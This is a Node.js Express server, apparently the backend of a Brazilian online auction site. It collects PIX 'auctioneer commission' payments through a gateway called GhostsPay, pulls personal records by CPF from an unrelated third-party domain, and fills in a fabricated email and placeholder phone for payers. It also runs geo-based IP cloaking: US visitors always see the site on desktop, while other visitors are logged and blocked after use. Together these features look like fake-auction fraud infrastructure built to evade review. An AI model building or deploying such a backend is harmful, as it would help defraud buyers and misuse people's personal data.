'use strict';

const express = require('express');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

app.set('trust proxy', 1); // IPs reais no Heroku

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─── IP Blocker (PostgreSQL permanente) ──────────────────────────────────────

const { Pool } = require('pg');
const pgPool = new Pool({ connectionString: process.env.DATABASE_URL });

// Garante que a tabela existe ao iniciar
pgPool.query(`
  CREATE TABLE IF NOT EXISTS blocked_ips (
    ip TEXT PRIMARY KEY,
    blocked_at TIMESTAMPTZ DEFAULT NOW()
  )
`).catch(() => {});

const geoip = require('geoip-lite');

function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return String(forwarded).split(',')[0].trim();
  return req.socket?.remoteAddress || req.ip || '';
}

function isUsIp(ip) {
  try {
    const geo = geoip.lookup(ip);
    return geo?.country === 'US';
  } catch {
    return false;
  }
}

app.get('/api/block/check', async (req, res) => {
  const ip = getClientIp(req);

  // IPs dos EUA nunca são bloqueados e podem acessar em desktop
  if (isUsIp(ip)) {
    return res.json({ blocked: false, allowDesktop: true, ip });
  }

  try {
    const result = await pgPool.query(
      'SELECT 1 FROM blocked_ips WHERE ip = $1 LIMIT 1',
      [ip]
    );
    res.json({ blocked: result.rowCount > 0, allowDesktop: false, ip });
  } catch {
    res.json({ blocked: false, allowDesktop: false, ip });
  }
});

app.post('/api/block/register', async (req, res) => {
  const ip = getClientIp(req);
  try {
    await pgPool.query(
      'INSERT INTO blocked_ips (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING',
      [ip]
    );
    res.json({ ok: true, ip });
  } catch {
    res.json({ ok: false, ip });
  }
});

// ─── Health ───────────────────────────────────────────────────────────────────

app.get('/api/healthz', (_req, res) => {
  res.json({ status: 'ok' });
});

// ─── CPF consulta ─────────────────────────────────────────────────────────────

app.get('/api/cpf/consulta', async (req, res) => {
  const cpf = String(req.query.cpf || '').replace(/\D/g, '');
  if (cpf.length !== 11) {
    return res.status(400).json({ error: 'CPF inválido' });
  }
  try {
    const response = await axios.get(
      `https://renouvaslab.beauty/api/consulta.php?cpf=${cpf}`,
      { timeout: 10000 }
    );
    return res.json(response.data);
  } catch (err) {
    return res.status(502).json({ error: 'Erro ao consultar CPF' });
  }
});

// ─── GhostsPay helpers ────────────────────────────────────────────────────────

const GHOSTSPAY_API_URL = 'https://api.ghostspaysv2.com/functions/v1';

function getAuthHeader() {
  const secretKey = process.env.GHOSTSPAY_SECRET_KEY;
  const companyId = process.env.GHOSTSPAY_COMPANY_ID;
  if (!secretKey || !companyId) {
    throw new Error('GhostsPay credentials missing (GHOSTSPAY_SECRET_KEY / GHOSTSPAY_COMPANY_ID)');
  }
  const credentials = Buffer.from(`${secretKey}:${companyId}`).toString('base64');
  return `Basic ${credentials}`;
}

// ─── PIX create ───────────────────────────────────────────────────────────────

app.post('/api/pix/create', async (req, res) => {
  try {
    const { name, email, cpf, phone, amount, lotTitle } = req.body;

    if (!name || !cpf || !amount) {
      return res.status(400).json({ error: 'name, cpf e amount são obrigatórios' });
    }

    const cleanCpf = cpf.replace(/\D/g, '');
    const cleanPhone = (phone || '11999999999').replace(/\D/g, '');
    const amountInCents = Math.round(Number(amount) * 100);

    const payload = {
      amount: amountInCents,
      paymentMethod: 'PIX',
      customer: {
        name,
        email: email || `${cleanCpf}@arrematante.com.br`,
        phone: cleanPhone,
        document: { number: cleanCpf, type: 'CPF' },
      },
      items: [
        {
          title: `Comissão Leiloeiro — ${lotTitle || 'Lote Leilão #144'}`,
          unitPrice: amountInCents,
          quantity: 1,
          tangible: false,
        },
      ],
    };

    const response = await axios.post(`${GHOSTSPAY_API_URL}/transactions`, payload, {
      headers: { Authorization: getAuthHeader(), 'Content-Type': 'application/json' },
      timeout: 15000,
    });

    const data = response.data;

    if (data.status === 'refused') {
      const reason =
        (data.refusedReason && data.refusedReason.description) || 'Transação recusada';
      return res.status(422).json({ error: reason });
    }

    return res.json({
      id: data.id,
      status: data.status,
      pixCode: (data.pix && data.pix.qrcode) || null,
      expirationDate: (data.pix && data.pix.expirationDate) || null,
    });
  } catch (err) {
    const msg =
      (err.response && err.response.data && err.response.data.message) ||
      err.message ||
      'Erro ao criar transação';
    return res.status(500).json({ error: msg });
  }
});

// ─── PIX status ───────────────────────────────────────────────────────────────

app.get('/api/pix/status/:id', async (req, res) => {
  try {
    const response = await axios.get(
      `${GHOSTSPAY_API_URL}/transactions/${req.params.id}`,
      {
        headers: { Authorization: getAuthHeader(), 'Content-Type': 'application/json' },
        timeout: 10000,
      }
    );
    const data = response.data;
    return res.json({ id: data.id, status: data.status, paidAt: data.paidAt || null });
  } catch (err) {
    const msg =
      (err.response && err.response.data && err.response.data.message) ||
      err.message ||
      'Erro ao consultar transação';
    return res.status(500).json({ error: msg });
  }
});

// ─── PIX stream — SSE real-time confirmation ──────────────────────────────────

const PAID_STATUSES_SET = new Set(['paid', 'approved', 'captured', 'authorized', 'settled']);

function isPaid(status, paidAt) {
  return PAID_STATUSES_SET.has(String(status || '').toLowerCase()) || !!paidAt;
}

app.get('/api/pix/stream/:id', (req, res) => {
  const txId = req.params.id;

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders();

  let closed = false;
  let pollTimer = null;
  let heartbeatTimer = null;

  function cleanup() {
    closed = true;
    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
    if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
  }

  function send(data) {
    if (!closed) res.write('data: ' + JSON.stringify(data) + '\n\n');
  }

  // Heartbeat every 20s — keeps Heroku from dropping idle connection
  heartbeatTimer = setInterval(() => {
    if (!closed) res.write(': heartbeat\n\n');
  }, 20000);

  // Poll GhostsPay every 3s server-side
  pollTimer = setInterval(async () => {
    if (closed) return;
    try {
      const response = await axios.get(
        `${GHOSTSPAY_API_URL}/transactions/${txId}`,
        {
          headers: { Authorization: getAuthHeader(), 'Content-Type': 'application/json' },
          timeout: 8000,
        }
      );
      const data = response.data;
      if (isPaid(data.status, data.paidAt)) {
        send({ type: 'payment_approved', status: data.status });
        cleanup();
        res.end();
      }
    } catch {
      // keep trying on transient errors
    }
  }, 3000);

  // Auto-close after 10 minutes
  const timeout = setTimeout(() => {
    if (!closed) {
      send({ type: 'timeout' });
      cleanup();
      res.end();
    }
  }, 10 * 60 * 1000);

  req.on('close', () => {
    clearTimeout(timeout);
    cleanup();
  });
});

// ─── Static frontend (built by Vite) ─────────────────────────────────────────

const STATIC_DIR = path.join(__dirname, 'artifacts', 'leilao-cb', 'dist', 'public');

app.use(express.static(STATIC_DIR));

app.get('*', (_req, res) => {
  res.sendFile(path.join(STATIC_DIR, 'index.html'));
});

// ─── Start ────────────────────────────────────────────────────────────────────

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});

process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully...');
  process.exit(0);
});
